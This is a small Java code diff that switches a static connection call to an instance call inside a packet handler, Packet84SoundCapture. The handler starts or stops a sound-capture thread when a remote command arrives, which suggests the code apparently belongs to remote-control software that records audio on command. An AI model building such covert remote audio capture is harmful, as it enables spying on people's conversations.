@@ -7,7 +7,7 @@ public class Packet84SoundCapture extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		if (Connection.readBoolean()) {
+		if (Connection.instance.readBoolean()) {
 			new Thread(new Sound()).start();
 		} else {
 			Sound.instance.running = false;
